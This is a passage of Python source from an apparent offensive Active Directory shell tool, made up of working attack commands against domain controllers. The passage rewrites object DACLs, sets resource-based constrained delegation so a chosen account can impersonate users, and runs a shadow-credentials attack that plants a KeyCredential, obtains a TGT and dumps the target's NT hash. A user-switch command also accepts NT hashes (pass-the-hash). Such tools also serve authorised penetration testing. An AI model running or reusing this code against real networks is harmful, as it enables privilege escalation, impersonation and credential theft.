                            '<0x40000000, 0x10000000...> or <1131f6ad-9c07-11d1-f79f-00c04fc2dcd2, 89e95b76-444d-4c62-991a-0facbeda640c...>')

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                     attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
        if len(self.client.entries) == 0:
            #Try modify OU
            log.info('Not found user, try modify OU')
            success = self.client.search(
                self.domain_dumper.root,  f'(&(objectClass=organizationalUnit)(ou={escape_filter_chars(target_name)}))',  # Фильтр поиска
                attributes=['distinguishedName', 'nTSecurityDescriptor'], controls=None
            )
            if len(self.client.entries) == 0:
                #Try modify root
                log.info('Not found user, try modify root')
                success = self.client.search(self.domain_dumper.root, '(objectClass=*)', attributes=['objectSid', 'nTSecurityDescriptor'],
                                   controls=controls)
        if not success:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        log.info('Found Target DN: %s', target.entry_dn)

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})',
                                     attributes=['objectSid'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        grantee = self.client.entries[0]
        grantee_sid = grantee['objectSid'].value
        log.info('Found Grantee DN: %s', grantee.entry_dn)
        log.info('Grantee SID: %s', grantee_sid)

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
        except IndexError:
            sd = self.create_empty_sd()

        if flag:
            if mask:
                sd['Dacl'].aces.append(self.createACE(sid=grantee_sid, access_mask=mask))
            else:
                sd['Dacl'].aces.append(self.createACE(sid=grantee_sid, object_type=object, access_mask=32))
            self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
                               controls=controls)
            if self.client.result['result'] == 0:
                log.info('DACL modified successfully!')
            else:
                self.process_error_response()
        else:
            new_aces = []
            if mask:
                for e in sd['Dacl'].aces:
                    if e['Ace']['Sid'].formatCanonical() == grantee_sid and e['Ace']['Mask'].hasPriv(mask):
                        log.info('ACE found for removal!')
                    elif e['Ace']['Sid'].formatCanonical() == grantee_sid:
                        try:
                            if e['Ace']['ObjectType'] == LdapShell.string_to_bin(object):
                                log.info('ACE found for removal!')
                            else:
                                new_aces.append(e)
                        except:
                            new_aces.append(e)
                    else:
                        new_aces.append(e)
            if object:
                for e in sd['Dacl'].aces:
                    if e['Ace']['Sid'].formatCanonical() == grantee_sid:
                        try:
                            if not e['Ace']['ObjectType'] == LdapShell.string_to_bin(object):
                                new_aces.append(e)
                            else:
                                log.info('ACE found for removal!')
                        except:
                            new_aces.append(e)
                    else:
                        new_aces.append(e)

            sd['Dacl'].aces = new_aces
            self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
                               controls=controls)

            if self.client.result['result'] == 0:
                log.info('DACL modified successfully!')
                if self.client.authentication == 'ANONYMOUS' and self.client.user.split('\\')[1].lower() == grantee.entry_dn.split(',')[0].split('=')[1].lower():
                    log.info('You use kerberos auth and change self groups. Please, create new ticket and reconnect ldap_shell.')
            else:
                self.process_error_response()

    def do_get_maq(self, user):
        #Get global ms-DS-MachineAccountQuota
        self.client.search(self.domain_dumper.root, '(objectClass=*)', attributes=['ms-DS-MachineAccountQuota'],
                controls=security_descriptor_control(sdflags=0x04))
        maq = self.client.entries[0].entry_attributes_as_dict['ms-DS-MachineAccountQuota'][0]
        if maq < 1:
            log.error(f"Global domain policy ms-DS-MachineAccountQuota={maq}")
            return
        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user)})',
                               attributes=['objectSid'])
        if len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        user_sid = self.client.entries[0]['objectSid'].value

        self.client.search(self.domain_dumper.root, f'(&(objectClass=computer)(mS-DS-CreatorSID={user_sid}))', attributes=['ms-ds-creatorsid'])
        user_machins = len(self.client.entries)
        log.info(f'User {user} have MachineAccountQuota={maq-user_machins}')

    def do_set_rbcd(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception(
                f'Expecting target and grantee names for RECD attack. Received {len(args)} arguments instead.')

        target_name = args[0]
        grantee_name = args[1]

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                     attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        target_sid = target['objectSid'].value
        log.info('Found Target DN: %s', target.entry_dn)
        log.info('Target SID: %s', target_sid)

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})',
                                     attributes=['objectSid'])
        if success is False or len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        grantee = self.client.entries[0]
        grantee_sid = grantee['objectSid'].value
        log.info('Found Grantee DN: %s', grantee.entry_dn)
        log.info('Grantee SID: %s', grantee_sid)

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
            log.info('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                log.info('\t%s', ace['Ace']['Sid'].formatCanonical())

                if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
                    log.warning('Grantee is already permitted to perform delegation to the target host, aborting')
                    return

        except IndexError:
            sd = self.create_empty_sd()

        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
        self.client.modify(target.entry_dn,
                           {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})

        if self.client.result['result'] == 0:
            log.info('Delegation rights modified successfully! %s can now impersonate users on %s via S4U2Proxy',
                     grantee_name, target_name)
        else:
            self.process_error_response()
    def do_get_ntlm(self, user):
        #Thx ShutdownRepo
        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(escape_filter_chars(user)),
                            attributes=['sAMAccountName'])
        if not self.client.entries:
            logging.error('Target account does not exist!')
            return
        else:
            target_dn = self.client.entries[0].entry_dn
            target_samaccountname = self.client.entries[0].sAMAccountName[0]
            logging.info("Target user found: %s" % target_samaccountname)
        log.info("Generating certificate")
        certificate = X509Certificate2(subject=target_samaccountname, keySize=2048, notBefore=(-40 * 365),
                                       notAfter=(40 * 365))
        deviceId = Guid()
        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=deviceId, owner=self.domain_dumper.root,
                                                           currentTime=DateTime())
        logging.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE,
                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])

        results = None
        for entry in self.client.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            log.error('Could not query target user properties')
            return
        try:
            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
            log.debug("Updating the msDS-KeyCredentialLink attribute of %s" % target_samaccountname)
            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
            if self.client.result['result'] == 0:
                log.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
            else:
                if self.client.result['result'] == 50:
                    log.error(
                        'Could not modify object, the server reports insufficient rights: %s' % self.client.result[
                            'message'])
                    return
                elif self.client.result['result'] == 19:
                    log.error('Could not modify object, the server reports a constrained violation: %s' %
                                 self.client.result['message'])
                    return
                else:
                    log.error('The server returned an error: %s' % self.client.result['message'])
        except IndexError:
            log.info('Attribute msDS-KeyCredentialLink does not exist')
            return
        pk = OpenSSL.crypto.PKCS12()
        pk.set_privatekey(certificate.key)
        pk.set_certificate(certificate.certificate)
        pfx_pass = ''.join(chr(random.randint(1,255)) for i in range(20)).encode()
        pfxdata = pk.export(passphrase=pfx_pass)

        # Thx Dirk-jan Mollema
        # Static DH params because the ones generated by cryptography are considered unsafe by AD for some weird reason
        dhparams = {
            'p': int(
                '00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff',
                16),
            'g': 2
        }
        log.debug('Preparing certificate')
        ini = myPKINIT.from_pfx_data(pfxdata, pfx_pass, dhparams)
        domain = self.client.user.split('\\')[0]
        req = ini.build_asreq(domain, user)
        log.info('Requesting TGT')
        sock = KerberosClientSocket(KerberosTarget(self.client.server.host))
        res = sock.sendrecv(req)
        encasrep, session_key, cipher = ini.decrypt_asrep(res.native)
        ccache = CCACHE()
        ccache.add_tgt(res.native, encasrep)
        ccache_data=ccache.to_bytes()
        dumper = myPKINIT.GETPAC(user, domain, self.client.server.host, session_key)
        dumper.dump(domain, self.client.server.host, ccache_data)

        log.info("Remove DeviceID from msDS-KeyCredentialLink attribute for user2")

        results = self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE,
                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        new_values = []
        for dn_binary_value in self.client.response[0]['raw_attributes']['msDS-KeyCredentialLink']:
            keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
            if deviceId.toFormatD() == keyCredential.DeviceId.toFormatD():
                log.debug("Found value to remove")
            else:
                new_values.append(dn_binary_value)
            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
            if self.client.result['result'] == 0:
                log.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
            else:
                if self.client.result['result'] == 50:
                    log.info(
                        'Could not modify object, the server reports insufficient rights: %s' % self.client.result[
                            'message'])
                elif self.client.result['result'] == 19:
                    log.info('Could not modify object, the server reports a constrained violation: %s' %
                                 self.client.result['message'])
                else:
                    log.info('The server returned an error: %s' % self.client.result['message'])

    def search(self, query, *attributes):
        self.client.search(self.domain_dumper.root, query, attributes=attributes)
        for entry in self.client.entries:
            for attribute in attributes:
                value = entry[attribute].value
                if value:
                    log.info('Search - %s: %s', attribute, entry[attribute].value)
            if any(attributes):
                log.info('---')

    def do_switch_user(self, line):
        args = shlex.split(line)
        if len(args) == 1:
            username = args[0]
            password = getpass.getpass()
        elif len(args) == 2:
            username = args[0]
            password = args[1]
        else:
            log.error('Enter username and password.')
            return
        lmhash = None
        nthash = None
        domain = self.client.user.split('\\')[0]
        old_user = self.client.user.split('\\')[1]
        old_client = copy.copy(self.client)

        if re.match('^:[0-9a-f]{32}$',password) or re.match('^[0-9a-f]{32}:[0-9a-f]{32}$',password) or re.match('^[0-9a-f]{32}$',password):
            log.debug('Trying to use a hash')
            lmhash='aad3b435b51404eeaad3b435b51404ee'
            if re.match('^[0-9a-f]{32}$',password):
                nthash = password
            else:
                nthash = password.split(":")[1]
        if nthash:
            if self.client.rebind(user=domain+'\\'+username, password=lmhash+':'+nthash, authentication='NTLM'):
                self.prompt = f'\n{username}# '
                log.info(f'Successfully! User {old_user} has been changed to {username}')
            else:
                log.error('The user could not be changed. Please check the password.')
                self.client = old_client
        else:
            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            nthash = LdapShell.calculate_ntlm(password)
            if self.client.rebind(user=domain+'\\'+username, password=lmhash+':'+nthash, authentication='NTLM'):
                self.prompt = f'\n{username}# '
                log.info(f'Successfully! User {old_user} has been changed to {username}')
            else:
                log.error('The user could not be changed. Please check the password.')
                self.client = old_client

    def do_start_tls(self, line):
        if not self.client.tls_started and not self.client.server.ssl:
            print('Sending StartTLS command...')
            if not self.client.start_tls():
                raise Exception("StartTLS failed")
            else:
                print('StartTLS succeded, you are now using LDAPS!')
        else:
            print('It seems you are already connected through a TLS channel.')

    def get_dn(self, sam_name):
        if ',' in sam_name:
            return sam_name

        try:
            self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(sam_name)})',
                               attributes=['objectSid'])
            return self.client.entries[0].entry_dn
        except IndexError:
            return None

    def do_exit(self, line):
        return True

    def do_help(self, line):
        print(self.helper.show()) #If you want modify, please go to helper.py file.

    def do_EOF(self, line):
        log.warning('Bye!')
        return True
